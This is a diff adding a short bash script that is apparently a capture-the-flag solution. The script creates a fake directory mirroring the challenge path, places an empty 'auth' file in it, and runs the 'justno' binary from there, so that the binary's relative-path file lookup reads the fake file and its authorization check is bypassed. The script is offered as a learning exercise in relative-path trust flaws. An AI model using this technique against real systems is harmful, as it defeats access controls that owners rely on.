@@ -1,0 +1,13 @@
+#!/bin/bash
+# Directory where executable and auth file are.
+DIR="/problems/ab718be873f8a7efe966f4ed5af749eb";
+# Fake directory on home.
+FAKE_DIR="~$DIR"
+# Make fake directory on home that has same path as real one.
+mkdir -p $FAKE_DIR &&
+# Make auth file that has no "no" text.
+touch $FAKE_DIR"/auth" &&
+# Move to the fake directory.
+cd $FAKE_DIR &&
+# Call the executable and because of relative path it will use your fake auth file.
+$DIR/justno
